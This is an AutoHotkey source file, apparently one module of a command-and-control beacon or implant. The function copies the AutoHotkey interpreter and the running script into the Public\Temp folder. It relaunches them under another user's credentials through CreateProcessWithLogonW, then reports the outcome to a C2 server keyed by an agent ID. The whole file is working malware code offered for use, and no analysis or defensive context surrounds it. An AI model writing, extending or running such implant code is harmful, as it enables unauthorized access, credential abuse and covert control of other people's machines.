; ============================================================================
; RUN AS USER MODULE
; ============================================================================
; Executes the beacon as a different user with provided credentials
; ============================================================================

RunAsUser(username := "default", password := "default") {

    targetPath := A_ScriptFullPath
    ; Get public directory path
    publicDir := EnvGet("PUBLIC") "\Temp"

    ; Create temp directory if it doesn't exist
    if !DirExist(publicDir) {
        DirCreate(publicDir)
    }

    ; Copy AutoHotkey executable
    ahkExePath := A_AhkPath
    ahkExeName := "AutoHotkey64.exe"  ;
    newExePath := publicDir "\" ahkExeName

    FileCopy ahkExePath, newExePath, 1  ; 1 = overwrite

    ; Copy script file
    scriptName := "tempScript.ahk"
    newScriptPath := publicDir "\" scriptName

    FileCopy targetPath, newScriptPath, 1

    ; Launch copied script with the executable
    try {

        si := Buffer(A_PtrSize = 8 ? 104 : 68, 0)
        NumPut("UInt", si.Size, si)
        pi := Buffer(A_PtrSize = 8 ? 24 : 16, 0)

        commandLine := Format('"{1}" "{2}"', newExePath, newScriptPath)

        result := DllCall("advapi32\CreateProcessWithLogonW"
            , "Str", username
            , "Ptr", 0
            , "Str", password
            , "UInt", 1
            , "Str", newExePath          ; Application name
            , "Str", commandLine         ; Command line
            , "UInt", 0x00000010
            , "Ptr", 0
            , "Str", publicDir
            , "Ptr", si
            , "Ptr", pi)

        if (!result) {
            lastError := DllCall("GetLastError")
            message := Format("command_output|{}|Execution failed, error: {}", this.agentID, lastError)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }

        DllCall("CloseHandle", "Ptr", NumGet(pi, 0, "Ptr"))
        DllCall("CloseHandle", "Ptr", NumGet(pi, A_PtrSize, "Ptr"))

        message := Format("command_output|{}|Execution successful", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return true

    } catch Error as err {
        message := Format("command_output|{}|Execution failed, error: {}", this.agentID, err.Message)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}
